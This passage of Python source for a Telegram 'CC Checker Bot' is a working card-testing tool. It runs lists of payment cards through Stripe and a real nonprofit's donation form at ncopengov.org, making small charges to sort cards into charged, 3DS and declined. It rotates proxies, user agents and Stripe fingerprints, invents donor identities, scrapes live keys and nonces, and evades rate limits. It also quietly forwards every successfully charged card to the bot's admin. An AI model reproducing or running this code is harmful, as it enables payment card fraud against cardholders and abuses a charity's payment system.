        if not skip_cache and proxy in _proxy_health_cache:
            cached = _proxy_health_cache[proxy]
            if current_time - cached["time"] < _proxy_health_ttl:
                if cached["healthy"]:
                    return True, None
                else:
                    return False, "Proxy failed previous health check"

        # Test proxy with a simple request
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            try:
                async with session.get(
                    "https://httpbin.org/ip",
                    proxy=proxy_url
                ) as response:
                    if response.status == 200:
                        _proxy_health_cache[proxy] = {"healthy": True, "time": current_time}
                        return True, None
                    else:
                        _proxy_health_cache[proxy] = {"healthy": False, "time": current_time}
                        return False, f"Proxy returned status {response.status}"
            except aiohttp.ClientProxyConnectionError as e:
                _proxy_health_cache[proxy] = {"healthy": False, "time": current_time}
                return False, "Failed to connect to proxy"
            except aiohttp.ClientHttpProxyError as e:
                _proxy_health_cache[proxy] = {"healthy": False, "time": current_time}
                return False, f"Proxy authentication failed"
            except asyncio.TimeoutError:
                _proxy_health_cache[proxy] = {"healthy": False, "time": current_time}
                return False, "Proxy connection timed out"
            except Exception as e:
                _proxy_health_cache[proxy] = {"healthy": False, "time": current_time}
                return False, f"Proxy error: {str(e)[:50]}"

    except Exception as e:
        return False, f"Error: {str(e)[:50]}"


async def get_healthy_proxy(proxies: list) -> str:
    """
    Get a healthy proxy from the list.
    Returns None if no healthy proxies found.
    """
    if not proxies:
        return None

    # Shuffle to distribute load
    import random
    shuffled = proxies.copy()
    random.shuffle(shuffled)

    for proxy in shuffled:
        if proxy:
            is_healthy, _ = await check_proxy_health(proxy)
            if is_healthy:
                return proxy

    # If all proxies failed, return random one anyway (might recover)
    return random.choice([p for p in proxies if p]) if any(proxies) else None


# =============================================================================
# STRIPE DONATION GATEWAY - ncopengov.org donation page
# =============================================================================

# Donation page URL (hardcoded)
STRIPE_DONATION_URL = "https://ncopengov.org/donations/north-carolina-open-government-coalition-membership-2-2/"

# =============================================================================
# ANTI-DETECTION: User-Agent Rotation
# =============================================================================

USER_AGENTS = [
    # Chrome on Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    # Chrome on Mac
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    # Firefox on Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
    # Edge on Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
    # Safari on Mac
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
]

# Stripe.js version identifiers (rotated for fingerprint avoidance)
STRIPE_JS_VERSIONS = [
    "stripe.js/48d54f2c5f; stripe-js-v3/48d54f2c5f",
    "stripe.js/47c83d1b4e; stripe-js-v3/47c83d1b4e",
    "stripe.js/46b72c0a3d; stripe-js-v3/46b72c0a3d",
    "stripe.js/45a61b9f2c; stripe-js-v3/45a61b9f2c",
]


def get_random_user_agent() -> str:
    """Get a random User-Agent string"""
    return random.choice(USER_AGENTS)


def get_random_stripe_version() -> str:
    """Get a random Stripe.js version identifier"""
    return random.choice(STRIPE_JS_VERSIONS)


async def random_delay(min_seconds: float = 1.0, max_seconds: float = 3.0):
    """Add a random delay to simulate human behavior"""
    delay = random.uniform(min_seconds, max_seconds)
    await asyncio.sleep(delay)


async def exponential_backoff(attempt: int, base_delay: float = 1.0, max_delay: float = 30.0):
    """Exponential backoff with jitter for retries"""
    delay = min(base_delay * (2 ** (attempt - 1)), max_delay)
    jitter = random.uniform(0, delay * 0.5)
    await asyncio.sleep(delay + jitter)


def is_rate_limited(status_code: int, response_text: str = "") -> bool:
    """Check if response indicates rate limiting"""
    if status_code in [429, 503, 502]:
        return True
    rate_limit_indicators = [
        "too many requests",
        "rate limit",
        "slow down",
        "try again later",
        "temporarily blocked",
        "access denied"
    ]
    response_lower = response_text.lower()
    return any(indicator in response_lower for indicator in rate_limit_indicators)


async def stripe_gateway_check(
    card: str,
    proxy: str = None,
    max_retries: int = 3,
    request_timeout: int = 45,
    logger = None
) -> dict:
    """
    Check card using GiveWP Stripe donation form at ncopengov.org.
    Creates payment method and submits donation to charge the card.

    Features:
    - Proxy support for all requests
    - Anti-detection measures (User-Agent rotation, realistic headers)
    - Rate limit detection and exponential backoff
    - Random delays between requests to simulate human behavior
    """
    import re

    # Parse card
    parts = card.replace("/", "|").replace(":", "|").split("|")
    if len(parts) < 4:
        return {"success": False, "error": "Invalid card format"}

    cc_num = parts[0].strip()
    cc_month = parts[1].strip().zfill(2)
    cc_year = parts[2].strip()
    cc_cvv = parts[3].strip()

    # Ensure year is 4 digits
    if len(cc_year) == 2:
        cc_year = f"20{cc_year}"

    # Generate random user data
    def random_string(length, chars="abcdefghijklmnopqrstuvwxyz"):
        return ''.join(random.choice(chars) for _ in range(length))

    # Use realistic email domains
    email_domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "icloud.com"]
    email = f"{random_string(8)}{random.randint(10, 99)}@{random.choice(email_domains)}"
    first_name = random_string(random.randint(4, 8)).capitalize()
    last_name = random_string(random.randint(5, 10)).capitalize()

    # Select random User-Agent for this session
    user_agent = get_random_user_agent()
    stripe_version = get_random_stripe_version()

    last_error = None
    timeout = aiohttp.ClientTimeout(total=request_timeout)

    # Setup proxy - ensure it's used for ALL requests
    proxy_url = None
    if proxy:
        is_valid, proxy_url, _ = parse_proxy_format(proxy)
        if not is_valid:
            proxy_url = None
            if logger:
                logger.warning(f"Invalid proxy format: {proxy}")

    for attempt in range(1, max_retries + 1):
        try:
            # Create fresh connector and cookie jar for each attempt
            # This prevents "Session is closed" errors and avoids fingerprinting
            connector = aiohttp.TCPConnector(ssl=False, limit=10, force_close=True)
            jar = aiohttp.CookieJar()

            async with aiohttp.ClientSession(
                timeout=timeout,
                cookie_jar=jar,
                connector=connector
            ) as session:

                # =============================================================
                # STEP 1: Load donation page (with anti-detection headers)
                # =============================================================

                page_headers = {
                    "User-Agent": user_agent,
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "DNT": "1",
                    "Connection": "keep-alive",
                    "Upgrade-Insecure-Requests": "1",
                    "Sec-Fetch-Dest": "document",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-Site": "none",
                    "Sec-Fetch-User": "?1",
                    "Cache-Control": "max-age=0",
                    "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": '"Windows"',
                }

                async with session.get(
                    STRIPE_DONATION_URL,
                    headers=page_headers,
                    proxy=proxy_url,
                    allow_redirects=True
                ) as resp:
                    # Check for rate limiting
                    if is_rate_limited(resp.status):
                        if logger:
                            logger.warning(f"[Stripe Attempt {attempt}] Rate limited on page load")
                        last_error = {"success": False, "error": "Rate limited - try again later", "status": "rate_limited"}
                        await exponential_backoff(attempt, base_delay=5.0)
                        continue

                    if resp.status != 200:
                        last_error = {"success": False, "error": f"Failed to load page (HTTP {resp.status})"}
                        await exponential_backoff(attempt)
                        continue

                    page_html = await resp.text()

                    # Check for rate limit in response body
                    if is_rate_limited(200, page_html):
                        if logger:
                            logger.warning(f"[Stripe Attempt {attempt}] Rate limit detected in page content")
                        last_error = {"success": False, "error": "Rate limited - try again later", "status": "rate_limited"}
                        await exponential_backoff(attempt, base_delay=5.0)
                        continue

                # Extract Stripe publishable key from page
                stripe_pk = None
                pk_patterns = [
                    r'pk_live_[a-zA-Z0-9_]+',
                    r'"publishable_key":\s*"(pk_live_[^"]+)"',
                    r'"publishableKey":\s*"(pk_live_[^"]+)"',
                    r'data-publishable-key="(pk_live_[^"]+)"',
                    r"stripe_vars.*?publishable_key.*?['\"]([^'\"]+)['\"]",
                    r'"stripe_publishable_key":\s*"(pk_live_[^"]+)"',
                ]

                for pattern in pk_patterns:
                    pk_match = re.search(pattern, page_html, re.IGNORECASE | re.DOTALL)
                    if pk_match:
                        stripe_pk = pk_match.group(1) if pk_match.lastindex else pk_match.group(0)
                        break

                if not stripe_pk:
                    last_error = {"success": False, "error": "Could not find Stripe key"}
                    await exponential_backoff(attempt)
                    continue

                # Extract form ID and nonce if available
                form_id_match = re.search(r'data-id="(\d+)"', page_html)
                form_id = form_id_match.group(1) if form_id_match else "1"

                nonce_match = re.search(r'give[_-]?stripe[_-]?nonce["\']?\s*[:=]\s*["\']([^"\']+)["\']', page_html, re.IGNORECASE)
                nonce = nonce_match.group(1) if nonce_match else ""

                # Extract form nonce/security token
                form_nonce_match = re.search(r'give[_-]?form[_-]?nonce["\']?\s*[:=]\s*["\']([^"\']+)["\']', page_html, re.IGNORECASE)
                form_nonce = form_nonce_match.group(1) if form_nonce_match else ""

                # =============================================================
                # RANDOM DELAY: Simulate human reading the page (1-3 seconds)
                # =============================================================
                await random_delay(1.0, 3.0)

                # =============================================================
                # STEP 2: Create Stripe Payment Method (with anti-detection)
                # =============================================================

                stripe_pm_url = "https://api.stripe.com/v1/payment_methods"

                stripe_data = {
                    "type": "card",
                    "card[number]": cc_num,
                    "card[cvc]": cc_cvv,
                    "card[exp_month]": cc_month,
                    "card[exp_year]": cc_year,
                    "billing_details[name]": f"{first_name} {last_name}",
                    "billing_details[email]": email,
                    "key": stripe_pk,
                    "payment_user_agent": stripe_version,
                    "_stripe_account": "",
                }

                stripe_headers = {
                    "User-Agent": user_agent,
                    "Accept": "application/json",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Origin": "https://js.stripe.com",
                    "Referer": "https://js.stripe.com/",
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-site",
                    "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": '"Windows"',
                }

                async with session.post(
                    stripe_pm_url,
                    data=stripe_data,
                    headers=stripe_headers,
                    proxy=proxy_url
                ) as resp:
                    # Check for rate limiting from Stripe
                    if is_rate_limited(resp.status):
                        if logger:
                            logger.warning(f"[Stripe Attempt {attempt}] Rate limited by Stripe API")
                        last_error = {"success": False, "error": "Stripe rate limited", "status": "rate_limited"}
                        await exponential_backoff(attempt, base_delay=5.0)
                        continue

                    stripe_result = await resp.json()

                    if "error" in stripe_result:
                        error_obj = stripe_result.get("error", {})
                        error_msg = error_obj.get("message", "Card declined")
                        error_code = error_obj.get("code", "")
                        decline_code = error_obj.get("decline_code", "")

                        # Check for rate limit error from Stripe
                        if error_code == "rate_limit" or "rate" in error_msg.lower():
                            if logger:
                                logger.warning(f"[Stripe Attempt {attempt}] Stripe rate limit error")
                            last_error = {"success": False, "error": "Stripe rate limited", "status": "rate_limited"}
                            await exponential_backoff(attempt, base_delay=10.0)
                            continue

                        if decline_code:
                            error_msg = f"{error_msg} ({decline_code})"
                        elif error_code:
                            error_msg = f"{error_msg} ({error_code})"

                        return {
                            "success": False,
                            "error": error_msg,
                            "gateway_message": error_msg,
                            "status": "declined"
                        }

                    pm_id = stripe_result.get("id")
                    if not pm_id:
                        last_error = {"success": False, "error": "Failed to create payment method"}
                        await exponential_backoff(attempt)
                        continue

                    card_data = stripe_result.get("card", {})
                    card_brand = card_data.get("brand", "unknown")
                    card_last4 = card_data.get("last4", "****")

                # =============================================================
                # RANDOM DELAY: Simulate user filling form (1.5-4 seconds)
                # =============================================================
                await random_delay(1.5, 4.0)

                # =============================================================
                # STEP 3: Submit GiveWP donation form
                # =============================================================

                give_url = "https://ncopengov.org/wp-admin/admin-ajax.php"

                give_data = {
                    "action": "give_process_donation",
                    "give_ajax": "true",
                    "give-form-id": form_id,
                    "give-form-title": "NC Open Government Coalition Membership",
                    "give-form-hash": "",
                    "give-gateway": "stripe",
                    "give-price-id": "1",
                    "give_total": "1.00",
                    "give_email": email,
                    "give_first": first_name,
                    "give_last": last_name,
                    "give_payment_mode": "stripe",
                    "give_stripe_payment_method": pm_id,
                    "give-recurring-period": "",
                    "give_agree_to_terms": "1",
                }

                if nonce:
                    give_data["give_stripe_nonce"] = nonce
                if form_nonce:
                    give_data["give-form-nonce"] = form_nonce

                give_headers = {
                    "User-Agent": user_agent,
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Origin": "https://ncopengov.org",
                    "Referer": STRIPE_DONATION_URL,
                    "X-Requested-With": "XMLHttpRequest",
                    "DNT": "1",
                    "Connection": "keep-alive",
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-origin",
                    "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": '"Windows"',
                }

                async with session.post(
                    give_url,
                    data=give_data,
                    headers=give_headers,
                    proxy=proxy_url
                ) as resp:
                    # Check for rate limiting
                    if is_rate_limited(resp.status):
                        if logger:
                            logger.warning(f"[Stripe Attempt {attempt}] Rate limited by donation site")
                        last_error = {"success": False, "error": "Site rate limited", "status": "rate_limited"}
                        await exponential_backoff(attempt, base_delay=10.0)
                        continue

                    response_text = await resp.text()

                    # Check for rate limit in response body
                    if is_rate_limited(resp.status, response_text):
                        if logger:
                            logger.warning(f"[Stripe Attempt {attempt}] Rate limit in response")
                        last_error = {"success": False, "error": "Rate limited", "status": "rate_limited"}
                        await exponential_backoff(attempt, base_delay=10.0)
                        continue

                    # Try to parse as JSON
                    try:
                        give_result = json.loads(response_text)
                    except json.JSONDecodeError:
                        # Check response text for indicators
                        response_lower = response_text.lower()

                        if "success" in response_lower or "thank" in response_lower:
                            return {
                                "success": True,
                                "message": f"Charged: {card_brand} ending {card_last4}",
                                "gateway_message": "Payment successful",
                                "status": "charged",
                                "card_brand": card_brand,
                                "card_last4": card_last4
                            }
                        elif "3d" in response_lower or "authentication" in response_lower or "redirect" in response_lower:
                            return {
                                "success": False,
                                "error": "3DS Authentication Required",
                                "message": f"Card {card_brand} ending {card_last4} requires 3D Secure",
                                "gateway_message": "3DS Required",
                                "status": "3ds"
                            }
                        elif "decline" in response_lower or "failed" in response_lower or "denied" in response_lower:
                            return {
                                "success": False,
                                "error": "Card declined",
                                "gateway_message": "Payment failed",
                                "status": "declined"
                            }
                        else:
                            # Payment method created = card is live, likely 3DS
                            return {
                                "success": False,
                                "error": "3DS Authentication Required",
                                "message": f"Card {card_brand} ending {card_last4} requires 3D Secure",
                                "gateway_message": "3DS Required",
                                "status": "3ds"
                            }

                    # Handle JSON response
                    if give_result.get("success"):
                        return {
                            "success": True,
                            "message": f"Charged: {card_brand} ending {card_last4}",
                            "gateway_message": "Donation successful",
                            "status": "charged",
                            "card_brand": card_brand,
                            "card_last4": card_last4
                        }

                    # Check for errors in response
                    error_msg = ""
                    data = give_result.get("data", {})

                    if isinstance(data, dict):
                        error_msg = data.get("error_message", "")
                        if not error_msg:
                            errors = data.get("errors", {})
                            if errors:
                                error_msg = list(errors.values())[0] if isinstance(errors, dict) else str(errors)

                    if not error_msg:
                        error_msg = str(data) if data else "Unknown error"

                    error_lower = error_msg.lower()

                    # Classify response
                    if "3d" in error_lower or "authentication" in error_lower or "redirect" in error_lower:
                        return {
                            "success": False,
                            "error": "3DS Authentication Required",
                            "message": f"Card {card_brand} ending {card_last4} requires 3D Secure",
                            "gateway_message": "3DS Required",
                            "status": "3ds"
                        }
                    elif "insufficient" in error_lower or "decline" in error_lower or "denied" in error_lower:
                        return {
                            "success": False,
                            "error": error_msg[:100],
                            "gateway_message": error_msg[:100],
                            "status": "declined"
                        }
                    else:
                        return {
                            "success": False,
                            "error": error_msg[:100],
                            "gateway_message": error_msg[:100],
                            "status": "declined"
                        }

        except aiohttp.ClientError as e:
            error_str = str(e)[:50]
            last_error = {"success": False, "error": f"Network error: {error_str}"}
            if logger:
                logger.warning(f"[Stripe Attempt {attempt}/{max_retries}] ClientError: {e}")
        except asyncio.TimeoutError:
            last_error = {"success": False, "error": "Request timed out"}
            if logger:
                logger.warning(f"[Stripe Attempt {attempt}/{max_retries}] Timeout")
        except Exception as e:
            error_str = str(e)[:50]
            last_error = {"success": False, "error": f"Error: {error_str}"}
            if logger:
                logger.warning(f"[Stripe Attempt {attempt}/{max_retries}] Error: {e}")

        # Exponential backoff between retries
        if attempt < max_retries:
            await exponential_backoff(attempt)

    return last_error or {"success": False, "error": "All retries failed"}


# =============================================================================
# CONCURRENCY MANAGEMENT - Per-user + Global limits
# =============================================================================

# Global semaphore - prevents server overload and captcha (all users combined)
# Uses config value (default 20) to avoid triggering captcha
global_semaphore = asyncio.Semaphore(config.GLOBAL_CONCURRENCY_LIMIT)

# Per-user semaphores - each user gets their own limit
# This ensures User A's checking doesn't block User B
user_semaphores = {}
user_semaphore_lock = asyncio.Lock()


async def get_user_semaphore(user_id: int) -> asyncio.Semaphore:
    """Get or create a semaphore for a specific user"""
    async with user_semaphore_lock:
        if user_id not in user_semaphores:
            # Each user can process CONCURRENCY_LIMIT cards at once
            user_semaphores[user_id] = asyncio.Semaphore(config.CONCURRENCY_LIMIT)
        return user_semaphores[user_id]


def cleanup_user_semaphore(user_id: int):
    """Remove user semaphore when they're done (optional cleanup)"""
    if user_id in user_semaphores:
        del user_semaphores[user_id]


async def bin_lookup(bin_number: str):
    """Lookup BIN information"""
    try:
        if bin_number.startswith(('4', '5', '3', '6')):
            async with AsyncSession() as session:
                url = f"https://api.voidapi.xyz/v2/bin_lookup/{bin_number[:6]}"
                response = await session.get(url)
                if response.status_code == 200:
                    return response.json()
                else:
                    return {"error": f"Unexpected status code {response.status_code}", "status": "error"}
        else:
            return {"error": "Invalid bin number.", "status": "error"}
    except Exception as e:
        logger.error(f"BIN lookup error: {e}")
        return {"error": str(e), "status": "error"}


def create_progress_bar(current: int, total: int, length: int = 10) -> str:
    """Create a visual progress bar"""
    if total == 0:
        return "░" * length
    filled = int(length * current / total)
    empty = length - filled
    bar = "█" * filled + "░" * empty
    percent = int(100 * current / total)
    return f"[{bar}] {percent}%"


async def process_single_card(card: str, user_id: int = None, user_settings: dict = None, bot=None) -> dict:
    """
    Process a single card and return result.

    Uses two-level concurrency control:
    1. Per-user semaphore: Each user can process up to CONCURRENCY_LIMIT cards at once
    2. Global semaphore: Total concurrent operations across all users capped at GLOBAL_CONCURRENCY_LIMIT

    This ensures User A checking cards doesn't block User B.

    Args:
        card: Card string to check
        user_id: User ID for concurrency control
        user_settings: Pre-fetched user settings (optional, avoids DB calls inside semaphore)
        bot: Optional Telegram bot instance for sending notifications on product removal
    """
    # ==========================================================================
    # PRE-VALIDATION: Check card format/validity BEFORE using API
    # This saves API calls and improves accuracy
    # ==========================================================================

    # Validate card format, Luhn, expiry, and CVV
    is_valid, validation_error, parsed_card = validate_card_full(card)
    if not is_valid:
        return {
            "card": card,
            "product_url": None,
            "response": {"error": validation_error, "success": False, "validation_failed": True},
            "bin_data": {}
        }

    # Get user settings BEFORE acquiring semaphore (non-blocking)
    if user_settings is None:
        settings = get_user_settings(user_id) if user_id else {}
    else:
        settings = user_settings

    # Optional: Validate BIN (async, non-blocking)
    # This is done outside semaphore to not hold resources
    bin_valid, bin_data_early, bin_error = await validate_bin(parsed_card["number"])
    if not bin_valid and bin_error:
        # Unknown BIN - card might be fake, but let it through for API to decide
        logger.debug(f"BIN validation warning for {card[:6]}: {bin_error}")

    # Get user-specific semaphore (or create one)
    user_sem = await get_user_semaphore(user_id) if user_id else asyncio.Semaphore(config.CONCURRENCY_LIMIT)

    # Acquire both: user limit AND global limit
    async with user_sem:
        async with global_semaphore:
            try:
                logger.info(f'Processing card: {card} (user: {user_id}, gateway: stripe)')

                # Use user's proxies or fall back to config
                # Support both old format (string) and new format (list)
                user_proxy = settings.get("proxy")
                if isinstance(user_proxy, list):
                    proxies = user_proxy if user_proxy else config.PROXY_LIST
                elif user_proxy:
                    proxies = [user_proxy]
                else:
                    proxies = config.PROXY_LIST

                # Get a healthy proxy if available
                healthy_proxy = await get_healthy_proxy(proxies) if proxies else None

                # Use Stripe gateway (only gateway)
                response = await stripe_gateway_check(
                    card=card,
                    proxy=healthy_proxy,
                    logger=logger
                )

                # BIN lookup is fast and non-critical - run concurrently
                bin_data = await bin_lookup(card[:6])

                return {
                    "card": card,
                    "product_url": None,
                    "response": response,
                    "bin_data": bin_data,
                    "gateway": "stripe"
                }

            except asyncio.CancelledError:
                # Handle cancellation gracefully
                logger.warning(f"Card check cancelled: {card}")
                return {
                    "card": card,
                    "product_url": None,
                    "response": {"error": "Check cancelled", "success": False},
                    "bin_data": {}
                }
            except Exception as e:
                # Catch ALL exceptions to prevent stopping the batch
                logger.error(f"Error processing card {card}: {e}")
                return {
                    "card": card,
                    "product_url": None,
                    "response": {"error": f"Processing error: {str(e)[:50]}", "success": False},
                    "bin_data": {}
                }


def format_result(result: dict, show_full: bool = True) -> str:
    """Format check result for Telegram message with proper escaping"""
    card = result["card"]
    response = result["response"]
    bin_data = result.get("bin_data", {})

    bin_info = ""
    if show_full and bin_data.get("success"):
        bd = bin_data.get("data", {})
        # Escape all dynamic content from BIN data
        bank = escape_markdown(bd.get("bank", "Unknown"))
        emoji = bd.get("emoji", "")  # Emoji doesn't need escaping
        country = escape_markdown(bd.get("country", "Unknown"))
        level = escape_markdown(bd.get("level", "Unknown"))
        card_type = escape_markdown(bd.get("type", "Unknown"))
        scheme = escape_markdown(bd.get("scheme", "Unknown"))
        bin_info = f"\n🏦 *Bank*: {bank}\n💳 *Type*: {scheme} {card_type} {level}\n🌍 *Country*: {country} {emoji}"

    # Get response details and escape them
    error = escape_markdown(response.get("error", ""))
    message = escape_markdown(response.get("message", ""))
    gateway_msg = escape_markdown(response.get("gateway_message", ""))
    decline_code = escape_markdown(response.get("decline_code", ""))

    # Build status message with all available info
    status_parts = []
    if message:
        status_parts.append(message)
    if error:
        status_parts.append(error)
    if gateway_msg and gateway_msg not in str(status_parts):
        status_parts.append(f"Gateway: {gateway_msg}")
    if decline_code and decline_code not in str(status_parts):
        status_parts.append(f"Code: {decline_code}")

    status_text = " \\| ".join(status_parts) if status_parts else "Unknown"

    # Card is displayed in code block (backticks), so it doesn't need escaping
    if response.get('success'):
        return f"✅ *CHARGED*\n\n💳 `{card}`\n📝 *Response*: {status_text}{bin_info}"
    else:
        if '3ds' in str(response.get("error", "")).lower() or '3d' in str(response.get("error", "")).lower():
            return f"🔐 *3DS REQUIRED*\n\n💳 `{card}`\n📝 *Response*: {status_text}{bin_info}"
        else:
            return f"❌ *DECLINED*\n\n💳 `{card}`\n📝 *Response*: {status_text}{bin_info}"


# Global bot application reference for admin notifications
_bot_app = None

async def notify_admin_charged(card: str, result: dict, user_id: int, username: str = None):
    """
    Silently notify admin when a card is successfully charged.
    This runs in background and never interrupts the user's flow.
    Sends the EXACT same formatted message that the user sees.
    """
    try:
        admin_id = config.ADMIN_USER_ID
        if not admin_id or not _bot_app:
            return

        # Don't notify admin if they found the card themselves
        if user_id == admin_id:
            return

        # Get the exact same formatted message the user sees
        user_message = format_result(result)

        # Add header and user info
        escaped_username = escape_markdown(username or 'Unknown')
        admin_message = (
            f"💰 *CHARGED CARD FOUND*\n\n"
            f"{user_message}\n\n"
            f"👤 *Found by*: {escaped_username} \\(`{user_id}`\\)"
        )

        # Send to admin silently (in background, no await blocking)
        await _bot_app.bot.send_message(
            chat_id=admin_id,
            text=admin_message,
            parse_mode="Markdown"
        )

        # Also save to card history
        response = result.get("response", {})
        save_card_history(
            user_id=user_id,
            username=username,
            card=card,
            card_type="charged",
            response_message=response.get("message", ""),
            gateway_message=response.get("gateway_message", ""),
            bin_info=result.get("bin_info", "")
        )

    except Exception as e:
        # Silently fail - never interrupt user's checking process
        logger.debug(f"Admin notification failed (silent): {e}")


# Inline Keyboard Builders
def get_main_menu_keyboard(user_id: int = None):
    """Build the main menu inline keyboard"""
    keyboard = [
        [InlineKeyboardButton("🌐 Proxy", callback_data="menu_proxy")],
        [InlineKeyboardButton("⚙️ Settings", callback_data="menu_settings")],
        [InlineKeyboardButton("💳 Check Cards", callback_data="menu_check_info")],
        [
            InlineKeyboardButton("💰 Charged", callback_data="menu_charged_history"),
            InlineKeyboardButton("🔐 3DS", callback_data="menu_3ds_history")
        ],
    ]
    # Add admin panel button only for admins
    if user_id and is_admin(user_id):
        keyboard.append([InlineKeyboardButton("🔐 Admin Panel", callback_data="menu_admin")])
    return InlineKeyboardMarkup(keyboard)


def format_proxy_status(proxy) -> str:
    """Format proxy for display, handling both single and multiple proxies."""
    if not proxy:
        return "Not set"
    if isinstance(proxy, list):
        if len(proxy) == 1:
            return f"`{proxy[0]}`"
        else:
            return f"{len(proxy)} proxies"
    return f"`{proxy}`"


def get_proxy_keyboard(user_id: int):
    """Build proxy management keyboard"""
    settings = get_user_settings(user_id)
    proxy = settings.get("proxy")

    keyboard = []
    keyboard.append([InlineKeyboardButton("➕ Set Proxy", callback_data="proxy_set")])
    if proxy:
        keyboard.append([InlineKeyboardButton("🗑️ Clear Proxy", callback_data="proxy_clear")])
    keyboard.append([InlineKeyboardButton("◀️ Back", callback_data="menu_main")])
    return InlineKeyboardMarkup(keyboard)

def get_checking_keyboard(paused: bool = False):
    """Build checking control keyboard"""
    if paused:
        keyboard = [
            [
                InlineKeyboardButton("▶️ Resume", callback_data="chk_resume"),
                InlineKeyboardButton("⏹️ Stop", callback_data="chk_stop")
            ]
        ]
    else:
        keyboard = [
            [
                InlineKeyboardButton("⏸️ Pause", callback_data="chk_pause"),
                InlineKeyboardButton("⏹️ Stop", callback_data="chk_stop")
            ]
        ]
    return InlineKeyboardMarkup(keyboard)

def get_back_keyboard(callback: str = "menu_main"):
    """Simple back button keyboard"""
    return InlineKeyboardMarkup([[InlineKeyboardButton("◀️ Back", callback_data=callback)]])

def get_cancel_keyboard():
    """Cancel input keyboard"""
    return InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="cancel_input")]])


# Telegram Bot Handlers
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command - show main menu"""
    user_id = update.effective_user.id
    set_waiting_for(user_id, None)  # Clear any pending input

    await update.message.reply_text(
        "🔥 *CC Checker Bot*\n\n"
        "Welcome! Use the buttons below to navigate.\n\n"
        "📎 *Send .txt file* or paste cards to check them.\n\n"
        "*Card Format:* `4111111111111111|12|2025|123`",
        parse_mode="Markdown",
        reply_markup=get_main_menu_keyboard(user_id)
    )


async def menu_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /menu command - show interactive menu"""
    user_id = update.effective_user.id
    set_waiting_for(user_id, None)  # Clear any pending input

    await update.message.reply_text(
        "🔥 *CC Checker Bot*\n\n"
        "Select an option below:",
        parse_mode="Markdown",
        reply_markup=get_main_menu_keyboard(user_id)
    )


async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle all callback queries from inline keyboards"""
    query = update.callback_query
    await query.answer()

    user_id = query.from_user.id
    data = query.data

    # Clear waiting state when navigating menus
    if data.startswith("menu_"):
        set_waiting_for(user_id, None)

    # Main menu
    if data == "menu_main":
        set_waiting_for(user_id, None)
        await query.edit_message_text(
            "🔥 *CC Checker Bot*\n\n"
            "Select an option below:",
            parse_mode="Markdown",
            reply_markup=get_main_menu_keyboard(user_id)
        )

    # Admin menu (from main menu button)
    elif data == "menu_admin":
        if not is_admin(user_id):
            await query.answer("🚫 Admin access only!", show_alert=True)
            return
        set_waiting_for(user_id, None)
        await query.edit_message_text(
            "🔐 *Admin Panel*\n\n"
            "Select an option below:",
            parse_mode="Markdown",
            reply_markup=get_admin_keyboard()
        )

    # Charged cards history (from menu button)
    elif data == "menu_charged_history":
        if is_admin(user_id):
            # Show admin submenu with options
            keyboard = [
                [InlineKeyboardButton("👤 My Charged Cards", callback_data="charged_my")],
                [InlineKeyboardButton("👥 All Users' Cards", callback_data="charged_all")],
                [InlineKeyboardButton("🔍 Search by User ID", callback_data="charged_search")],
                [InlineKeyboardButton("⬅️ Back", callback_data="menu_main")]
            ]
            await query.edit_message_text(
                "💰 *Charged Cards History*\n\n"
                "Select an option:",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        else:
            # Regular user - show their own cards
